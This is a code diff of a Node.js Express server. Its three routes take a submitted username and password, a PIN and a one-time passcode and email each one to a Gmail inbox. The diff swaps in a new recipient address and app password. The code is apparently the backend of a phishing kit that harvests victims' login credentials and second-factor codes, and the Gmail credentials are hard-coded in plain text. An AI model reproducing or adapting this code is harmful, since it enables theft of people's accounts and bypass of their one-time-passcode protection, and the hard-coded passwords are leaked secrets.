@@ -20,14 +20,14 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "goodsfavor4321@gmail.com",
-      pass: "esvetbavaoatevig",
+      user: "Mmaghaebube@gmail.com",
+      pass: "ghbuwywltyalfeyd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "goodsfavor4321@gmail.com",
+    to: "Mmaghaebube@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -50,14 +50,14 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "goodsfavor4321@gmail.com",
-      pass: "esvetbavaoatevig",
+      user: "Mmaghaebube@gmail.com",
+      pass: "ghbuwywltyalfeyd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "goodsfavor4321@gmail.com",
+    to: "Mmaghaebube@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -80,14 +80,14 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "goodsfavor4321@gmail.com",
-      pass: "esvetbavaoatevig",
+      user: "Mmaghaebube@gmail.com",
+      pass: "ghbuwywltyalfeyd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "goodsfavor4321@gmail.com",
+    to: "Mmaghaebube@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
